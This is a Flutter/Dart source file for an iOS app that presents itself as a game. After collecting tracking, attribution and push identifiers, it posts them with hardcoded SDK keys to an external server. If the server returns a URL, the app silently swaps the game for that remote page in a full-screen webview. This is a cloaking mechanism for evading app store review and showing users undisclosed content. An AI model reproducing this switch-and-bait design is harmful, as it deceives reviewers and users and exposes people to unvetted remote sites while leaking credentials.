import 'dart:async';
import 'dart:convert';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:dio/dio.dart';
import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/material.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:firebase_core/firebase_core.dart';
// import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/services.dart';

import 'onboard_screen.dart';

final String onesignalAppId = "295922e2-7cff-4c16-928b-924682300e39";
final String appsFlyerDevKey = "iJkqroQAM4zhXPkYDYwyca";
final String serverUrl = "https://consumerins.icu/saperdimond-tech";
final String appName = 'SaperDoimondsaIos';
final String bundleId = 'com.dimondd';
final String appId = '6745942074';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  await AppTrackingTransparency.requestTrackingAuthorization();
  OneSignal.initialize(onesignalAppId);
  await OneSignal.Notifications.requestPermission(true);
  runApp(GameTimer());
}

class GameTimer extends StatefulWidget {
  const GameTimer({Key? key}) : super(key: key);

  @override
  State<GameTimer> createState() => _GameTimerState();
}

class _GameTimerState extends State<GameTimer> {
  final GlobalKey webViewKey = GlobalKey();
  final dio = Dio();
  DeepLink? _deepLinkResult;
  Map<String, dynamic> _asaData = {};
  Map<String, dynamic> _conversionData = {};
  String? _firebaseInstanceId;
  String? _customDeepLinkData;

  AppsflyerSdk? _appsFlyerSdk;
  final _dataCompleter = Completer<Map<String, dynamic>>();

  String? _loadUrl;
  bool _urlLoaded = false;
  bool _isInitializing = false;

  static const platform = MethodChannel('com.dimondd/deeplink');

  @override
  void initState() {
    super.initState();
    _initializeAll();
    _setupCustomDeepLinkHandling();
  }

  Future<void> _setupCustomDeepLinkHandling() async {
    // Обработка deeplink при запуске приложения
    try {
      final String? initialLink = await platform.invokeMethod('getInitialLink');
      if (initialLink != null && initialLink.startsWith('saperdd://')) {
        _handleCustomDeepLink(initialLink);
      }
    } catch (e) {
      print("Error getting initial link: $e");
    }

    // Обработка deeplink при работающем приложении
    platform.setMethodCallHandler((MethodCall call) async {
      if (call.method == 'onDeepLinkReceived') {
        final String link = call.arguments as String;
        if (link.startsWith('saperdd://')) {
          _handleCustomDeepLink(link);
        }
      }
    });
  }

  void _handleCustomDeepLink(String link) {
    print("Custom deep link received: $link");
    setState(() {
      _customDeepLinkData = link;
    });

    // Парсим параметры из deeplink
    final uri = Uri.parse(link);
    final Map<String, String> params = uri.queryParameters;

    print("Deep link parameters: $params");

    // Можно сохранить параметры для использования в запросе на сервер
    if (params.isNotEmpty) {
      _customDeepLinkData = jsonEncode(params);
    }
  }

  Future<void> _getFirebaseInstanceId() async {
    try {
      // final FirebaseMessaging messaging = FirebaseMessaging.instance;
      // _firebaseInstanceId = await messaging.getToken();
      print("Firebase Instance ID: $_firebaseInstanceId");
    } catch (e) {
      print("Error getting Firebase Instance ID: $e");
      _firebaseInstanceId = null;
    }
  }

  Future<void> _fetchAppleSearchAdsData() async {
    try {
      final String? appleSearchAdsToken =
          await FlutterAsaAttribution.instance.attributionToken();
      if (appleSearchAdsToken != null) {
        const url = 'https://api-adservices.apple.com/api/v1/';
        final headers = {'Content-Type': 'text/plain'};
        final response = await http.post(Uri.parse(url),
            headers: headers, body: appleSearchAdsToken);

        if (response.statusCode == 200) {
          _asaData = json.decode(response.body);
        }
      }
    } catch (e) {
      print("ASA Data fetch error: $e");
    }
  }

  Future<void> _initializeAll() async {
    if (_isInitializing) return;
    _isInitializing = true;

    try {
      final prefs = await SharedPreferences.getInstance();
      final storedUrl = prefs.getString('url_answer');

      if (storedUrl != null) {
        _completeDataCompleter({'storedUrl': storedUrl});
        setState(() {
          _loadUrl = storedUrl;
          _urlLoaded = true;
        });
        _isInitializing = false;
        return;
      }

      await AppTrackingTransparency.requestTrackingAuthorization();
      await _getFirebaseInstanceId();
      await _fetchAppleSearchAdsData();
      _dataCompleter.complete({'appsFlyerData': 'No Data'});
      await _initializeAppsFlyer();
    } catch (e) {
      print("Initialization error: $e");
    }
  }

  void _completeDataCompleter(Map<String, dynamic> data) {
    if (!_dataCompleter.isCompleted) {
      _dataCompleter.complete(data);
    }
  }

  Future<void> _initializeAppsFlyer() async {
    try {
      return await Future.any([
        _actualAppsFlyerInit(),
        Future.delayed(const Duration(seconds: 8), () {
          if (!_dataCompleter.isCompleted) {
            _dataCompleter.complete({'appsFlyerData': 'No Data'});
          }
          return;
        })
      ]);
    } catch (e) {
      print("AppsFlyer initialization error: $e");
      if (!_dataCompleter.isCompleted) {
        _dataCompleter
            .complete({'error': e.toString(), 'appsFlyerData': 'No Data'});
      }
    }
  }

  Future<void> _actualAppsFlyerInit() async {
    final appsFlyerOptions = AppsFlyerOptions(
      afDevKey: appsFlyerDevKey,
      appId: appId,
      timeToWaitForATTUserAuthorization: 15,
      showDebug: true,
    );

    _appsFlyerSdk = AppsflyerSdk(appsFlyerOptions);

    await _appsFlyerSdk?.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    _appsFlyerSdk?.onDeepLinking((DeepLinkResult dp) {
      print("Deep linking result: ${dp.status}");
      if (dp.status == Status.FOUND) {
        _deepLinkResult = DeepLink(dp.deepLink?.clickEvent ?? {});
      }
    });

    _appsFlyerSdk?.onInstallConversionData((response) {
      if (!_dataCompleter.isCompleted) {
        if (response != null && response['payload'] != null) {
          final payload = response['payload'] as Map<String, dynamic>;
          Map<String, dynamic> data = {};
          payload.forEach((key, value) {
            if (value != null) {
              data[key] = value;
            }
          });

          if (data.isNotEmpty) {
            _dataCompleter.complete({...data});
          } else {
            _dataCompleter.complete({'appsFlyerData': 'No Data'});
          }
        } else {
          _dataCompleter.complete({'appsFlyerData': 'No Data'});
        }
      }
    });
  }

  Future<String?> _initializeAndFetchData(Map<String, dynamic> data) async {
    try {
      print("Initialize and fetch data with: $data");
      if (data.containsKey('storedUrl')) {
        return data['storedUrl'];
      }

      final prefs = await SharedPreferences.getInstance();
      String? externalId = prefs.getString('external_id');
      if (externalId == null) {
        externalId = DateTime.now().millisecondsSinceEpoch.toString();
        await prefs.setString('external_id', externalId);
      }
      OneSignal.login(externalId);
      String appsFlyerUID;
      try {
        appsFlyerUID = await _appsFlyerSdk?.getAppsFlyerUID() ?? '';
        print("AppsFlyerUID: $appsFlyerUID");
      } catch (e) {
        print("Error getting AppsFlyer UID: $e");
        appsFlyerUID = '';
      }

      final requestData = {
        "app_id": 'id$appId',
        "app_name": appName,
        "package_id": bundleId,
        "appsflyer_id": appsFlyerUID,
        "dev_key": appsFlyerDevKey,
        "onesignal_app_id": onesignalAppId,
        "onesignal_external_id": externalId,
        // "firebase_instance_id": _firebaseInstanceId ?? '',
        "platform": "ios",
        "deeplinkhost": "",
        "deeplinkscheme": "saperdd",
        ...data,
      };

      // Добавляем данные custom deeplink если есть
      if (_customDeepLinkData != null) {
        requestData["custom_deep_link"] = _customDeepLinkData;
        requestData["custom_deep_link_scheme"] = "saperdd";
      }

      if (_conversionData.containsKey('payload')) {
        Map<String, dynamic> appsFlyerData = _conversionData['payload'];
        if (appsFlyerData.containsKey('media_source')) {
          String alternateMedium = 'medium';
          if (appsFlyerData['campaign'] != null &&
              appsFlyerData['campaign'].toString().isNotEmpty) {
            String campaignString = appsFlyerData['campaign'].toString();
            List<String> parts = campaignString.split('_');
            alternateMedium = parts.isNotEmpty ? parts[0] : campaignString;
          }
          requestData.addAll({
            'utm_medium': appsFlyerData['af_sub1'] != 'auto' &&
                    appsFlyerData['af_sub1'] != null &&
                    appsFlyerData['af_sub1'].toString().isNotEmpty
                ? appsFlyerData['af_sub1']
                : alternateMedium,
            'utm_content': appsFlyerData['af_sub2'] != 'auto' &&
                    appsFlyerData['af_sub2'] != null &&
                    appsFlyerData['af_sub2'].toString().isNotEmpty
                ? appsFlyerData['af_sub2']
                : (appsFlyerData['campaign']?.toString() ?? 'campaign'),
            'utm_term': appsFlyerData['af_sub3'] != 'auto' &&
                    appsFlyerData['af_sub3'] != null &&
                    appsFlyerData['af_sub3'].toString().isNotEmpty
                ? appsFlyerData['af_sub3']
                : (appsFlyerData['af_ad']?.toString() ?? 'af_ad'),
            'utm_source': appsFlyerData['af_sub4'] != 'auto' &&
                    appsFlyerData['af_sub4'] != null &&
                    appsFlyerData['af_sub4'].toString().isNotEmpty
                ? appsFlyerData['af_sub4']
                : (appsFlyerData['media_source']?.toString() ?? 'media_source'),
            'utm_campaign': appsFlyerData['af_sub5'] != 'auto' &&
                    appsFlyerData['af_sub5'] != null &&
                    appsFlyerData['af_sub5'].toString().isNotEmpty
                ? appsFlyerData['af_sub5']
                : (appsFlyerData['af_adset']?.toString() ?? 'af_adset'),
          });
        }
      }

      // if (_deepLinkResult != null) {
      //   print("Adding deep link data");
      //   requestData.addAll({
      //     'deep_link_value': _deepLinkResult?.deepLinkValue ?? '',
      //     'deep_link_sub1': _deepLinkResult?.deep_link_sub1 ?? '',
      //     'deep_link_sub2': _deepLinkResult?.deep_link_sub2 ?? '',
      //     'deep_link_sub3': _deepLinkResult?.deep_link_sub3 ?? '',
      //     'deep_link_sub4': _deepLinkResult?.deep_link_sub4 ?? '',
      //     'deep_link_sub5': _deepLinkResult?.deep_link_sub5 ?? '',
      //     'match_type': _deepLinkResult?.matchType ?? '',
      //     'is_deferred': _deepLinkResult?.isDeferred ?? false,
      //     'media_source': _deepLinkResult?.mediaSource ?? '',
      //     'click_http_referrer': _deepLinkResult?.clickHttpReferrer ?? '',
      //   });
      // }

      if (_asaData.containsKey('attribution') &&
          _asaData['attribution'] == true) {
        requestData.addAll({
          'adId': _asaData['adId']?.toString() ?? '',
          'conversionType': _asaData['conversionType'] ?? '',
          'keywordId': _asaData['keywordId']?.toString() ?? '',
          'adGroupId': _asaData['adGroupId']?.toString() ?? '',
          'campaignId': _asaData['campaignId']?.toString() ?? '',
        });
      }

      final response = await dio.post(
        serverUrl,
        data: requestData,
        options: Options(
          headers: {"Content-Type": "application/json"},
        ),
      );
      if (response.statusCode == 200) {
        final status = response.data['status'];
        if (status != null && status.toString().isNotEmpty) {
          try {
            final statusResponse = await http.get(WebUri(status));
            if (statusResponse.statusCode == 404) {
              _isInitializing = false;
              return null;
            }

            await prefs.setString('url_answer', status);
            _isInitializing = false;
            return status;
          } catch (e) {
            _isInitializing = false;
            return null;
          }
        }
      }
      _isInitializing = false;
      return null;
    } catch (e) {
      _isInitializing = false;
      return null;
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        primarySwatch: Colors.orange,
        scaffoldBackgroundColor: Colors.black,
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          foregroundColor: Colors.white,
        ),
        colorScheme: ColorScheme.dark(
          primary: Colors.orange,
          secondary: Colors.orange,
          background: Colors.black,
        ),
      ),
      home: Scaffold(
        body: FutureBuilder<Map<String, dynamic>>(
            future: _dataCompleter.future,
            builder: (context, dataSnapshot) {
              if (!dataSnapshot.hasData) {
                return LoadingScreen();
              }

              return FutureBuilder<String?>(
                future: _initializeAndFetchData(dataSnapshot.data!),
                builder: (context, urlSnapshot) {
                  if (urlSnapshot.connectionState == ConnectionState.waiting) {
                    return LoadingScreen();
                  } else if (urlSnapshot.hasData && urlSnapshot.data != null) {
                    return SafeArea(
                      bottom: false,
                      child: InAppWebView(
                        initialUrlRequest: URLRequest(
                          url: WebUri(urlSnapshot.data!),
                        ),
                        onWebViewCreated:
                            (InAppWebViewController controller) {},
                        onLoadStart: (controller, url) {},
                        onLoadStop: (controller, url) {},
                        onProgressChanged: (controller, progress) {},
                      ),
                    );
                  } else {
                    return MainScreen();
                  }
                },
              );
            }),
      ),
    );
  }
}

class DeepLink {
  DeepLink(this._clickEvent);
  final Map<String, dynamic> _clickEvent;

  Map<String, dynamic> get clickEvent => _clickEvent;

  String? get deepLinkValue => _clickEvent["deep_link_value"] as String?;
  String? get matchType => _clickEvent["match_type"] as String?;
  String? get clickHttpReferrer =>
      _clickEvent["click_http_referrer"] as String?;
  String? get mediaSource => _clickEvent["media_source"] as String?;
  String? get deep_link_sub1 => _clickEvent["deep_link_sub1"] as String?;
  String? get deep_link_sub2 => _clickEvent["deep_link_sub2"] as String?;
  String? get deep_link_sub3 => _clickEvent["deep_link_sub3"] as String?;
  String? get deep_link_sub4 => _clickEvent["deep_link_sub4"] as String?;
  String? get deep_link_sub5 => _clickEvent["deep_link_sub5"] as String?;

  bool get isDeferred => _clickEvent["is_deferred"] as bool? ?? false;

  @override
  String toString() {
    return 'DeepLink: ${jsonEncode(_clickEvent)}';
  }

  String? getStringValue(String key) {
    return _clickEvent[key] as String?;
  }
}

class LoadingScreen extends StatelessWidget {
  const LoadingScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Image.asset(
          'assets/loading_bg.png',
          fit: BoxFit.cover,
          width: double.infinity,
          height: double.infinity,
        ),
      ),
    );
  }
}
